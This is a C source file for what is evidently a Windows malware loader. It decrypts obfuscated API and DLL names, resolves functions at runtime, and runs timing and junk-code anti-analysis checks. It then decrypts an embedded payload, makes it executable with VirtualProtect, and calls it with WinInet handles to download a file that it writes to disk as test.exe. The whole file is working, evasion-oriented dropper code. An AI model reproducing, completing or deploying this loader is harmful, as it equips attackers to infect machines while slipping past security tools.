#include "loader.h"

#include "payload_enc.c"
#include "entropy_low.c"
// #include "dynamic_strings.c"



void DBGLG(char buf[], ...){
    #ifdef DEBUG_print
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}


// unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
void* args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};





HMODULE Kernel32Module;
HMODULE WininetModule;
HMODULE user32Module;
pCreateDesktopW _CreateDesktopW;
pSetThreadDesktop _SetThreadDesktop;
MessageBoxWFunc _MessageBoxW;
pVirtualProtect _VirtualProtect;
pCreateFileW _CreateFileW;
pWriteFile _WriteFile;
pCloseHandle _CloseHandle;
pInternetOpenW _InternetOpen;
pInternetOpenUrlA _InternetOpenUrlA;
pInternetReadFile _InternetReadFile;
pInternetCloseHandle _InternetCloseHandle;
pGetLastError _GetLastError;
pCreateThread _CreateThread;
pCloseHandle _CloseHandle;
pCloseDesktop _CloseDesktop;
pGetSystemTime _GetSystemTime = NULL;
pExitProcess _ExitProcess;

extern unsigned char cMessageBoxW[];
extern unsigned char cVirtualProtect[];
extern unsigned char cCreateFileW[];
extern unsigned char cWriteFile[];
extern unsigned char cCloseHandle[];
extern unsigned char cGetSystemTime[];
extern unsigned char cInternetOpenW[];
extern unsigned char cInternetOpenUrlA[];
extern unsigned char cInternetReadFile[];
extern unsigned char cInternetCloseHandle[];
extern unsigned char cGetLastError[];
extern unsigned char cCreateDisktopW[];
extern unsigned char cSetThreadDesktop[];
extern unsigned char cCreateThread[];
extern unsigned char cCloseDesktop[];
extern unsigned char cExitProcess[];
extern unsigned char cRtlExitUserProcess[];
extern unsigned char cLdrLoadDll[];
extern unsigned char cRtlInitUnicodeString[];
extern unsigned char sKernelbase[];
extern unsigned char sWininet[];
extern unsigned char sUser32[];
extern unsigned char sNtdll[];
extern unsigned char sntdll_full_path[];
/* FIXME: GetEnvironmentVariableA("WINDIR", buf, sz) instead of C:\\ */
extern unsigned char MasterKeyStrings[];
extern unsigned char MasterKeyPayload[];



volatile int mutex_setupWinApi = 0;
HDESK desktop;

DWORD WINAPI setupWinApi(){
    // DYNAMIC_RETURN;
    int x = 1;
    int y = 187;
    while (mutex_setupWinApi != 1){
        x = y * x & 4 % 6;
        y = x * x;
    }
    _SetThreadDesktop(desktop);
    _MessageBoxW = (MessageBoxWFunc)(_GetProcAddress(user32Module, cMessageBoxW));
    _CloseDesktop = (pCloseDesktop)_GetProcAddress(user32Module, cCloseDesktop);
    _VirtualProtect = (pVirtualProtect)_GetProcAddress(Kernel32Module, cVirtualProtect);
    _CreateFileW = (pCreateFileW)_GetProcAddress(Kernel32Module, cCreateFileW);
    _WriteFile = (pWriteFile)_GetProcAddress(Kernel32Module, cWriteFile);
    // DYNAMIC_RETURN;
    _CloseHandle = (pCloseHandle)_GetProcAddress(Kernel32Module, cCloseHandle);
    _InternetOpen = (pInternetOpenW)_GetProcAddress(WininetModule, cInternetOpenW);
    _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, cInternetOpenUrlA);
    _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, cInternetReadFile);
    _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, cInternetCloseHandle);
    _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,cGetLastError);
    _ExitProcess = (pExitProcess)(cRtlExitUserProcess);

    x = y * x & 4 % 6;
    y = x * x;
    mutex_setupWinApi = 0;
    return x + y;
}

int pseudo_main(){
    // DYNAMIC_RETURN;
    int sz = 0;
    payload p;
    DWORD threadId;
    HANDLE threadHandle;
    unsigned char KeyList[176];
    DWORD junk[sizeof(PDWORD)];
    unsigned char execute_me[sizeof(payload_enc_bytes)];
    unsigned char buf[200 * 1024];
    int x = 58;
    int y = 18;

    #ifndef DEBUG
    TOMFOOLERY
    #endif

    INIT_CONST();
    KeyScheduler(MasterKeyStrings, KeyList);
    unsigned char* decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
                                     cVirtualProtect, cCreateFileW,
                                     cWriteFile, cCloseHandle, cInternetOpenW,
                                     cInternetOpenUrlA, cInternetOpenUrlA + 16,
                                     cInternetReadFile, cInternetReadFile + 16,
                                     cInternetCloseHandle, cInternetCloseHandle + 16,
                                     cGetLastError, cCreateDisktopW, cSetThreadDesktop,
                                     cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
                                     cRtlExitUserProcess, cRtlExitUserProcess + 16,
                                     sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
                                     sWininet, sWininet + 16, sNtdll, sNtdll + 16,
                                     sntdll_full_path, sntdll_full_path + 16,
                                     sntdll_full_path + 32, sntdll_full_path + 48,
                                     cLdrLoadDll, cRtlInitUnicodeString,
                                     cRtlInitUnicodeString + 16, MasterKeyPayload};
    // FIXME: Change hardcoded i parameter every time you update decryptme
    for (int i = 0; i < sizeof(decryptme)/8; ++i){
        Decrypt(decryptme[i], KeyList);
    }
    Kernel32Module = _LoadLibrary((LPWSTR)sKernelbase);
    WininetModule = _LoadLibrary((LPWSTR)sWininet);
    user32Module = _LoadLibrary((LPWSTR)sUser32);
    _CreateThread = (pCreateThread)_GetProcAddress(Kernel32Module, cCreateThread);
    _CreateDesktopW = (pCreateDesktopW)_GetProcAddress(user32Module, cCreateDisktopW);
    _SetThreadDesktop = (pSetThreadDesktop)_GetProcAddress(user32Module, cSetThreadDesktop);
    _GetSystemTime = (pGetSystemTime)_GetProcAddress(Kernel32Module, cGetSystemTime);
    #ifndef DEBUG
    RECORD_TIME
    #endif
    if (!_CreateThread){
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, 0);
        i = GdiplusStartup(NULL, NULL, NULL);
        RegisterClassW(NULL);
        CreateWindowExW(0, NULL, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
        ShowWindow(NULL, 0);
        UpdateWindow(NULL);
        CloseWindow(NULL);
        GdiplusShutdown((ULONG_PTR)NULL);
    }
    if ((threadHandle = _CreateThread(NULL, 0, setupWinApi, NULL, 0, &threadId)) == NULL){
        return -89;
    }
    if ((desktop = _CreateDesktopW(L"Lolers", NULL, NULL, 0, GENERIC_ALL, NULL)) == NULL){
        return -851;
    }
    mutex_setupWinApi = 1;
    while (mutex_setupWinApi == 1){
        x = y * x & 4 % 6;
        #ifndef DEBUG
        CHECK_TIME
        #endif
        y = x * x ^ 17;
    }
    _CloseHandle(threadHandle);
    _CloseDesktop(desktop);
    args[0] = _InternetOpen;
    args[1] = _InternetOpenUrlA;
    args[2] = _InternetReadFile;
    args[3] = _InternetCloseHandle;
    args[4] = buf;
    args[5] = &sz;
    HANDLE hFile = _CreateFileW(L"./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }
    // RANDOM_BYTE
    #ifndef DEBUG
    SHORT_JMP
    #endif
    KeyScheduler(MasterKeyPayload, KeyList);
    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
        Decrypt(execute_me + i, KeyList);
    }
    #ifndef DEBUG
    CHECK_TIME
    #endif
    _VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, (PDWORD)&junk);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p = (payload)(execute_me);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p(args);
    DWORD bytesWritten;
    BOOL result = _WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
    if (!result) {
        _CloseHandle(hFile);
        return 1;
    }
    _CloseHandle(hFile);
    #ifdef DEBUG
    _MessageBoxW(NULL, L"OK", L"OK", MB_OK);
    #endif
    return x + y;
}

void WinMainCRTStartup(){
    // DYNAMIC_RETURN;
    pseudo_main();
    _ExitProcess(0);
}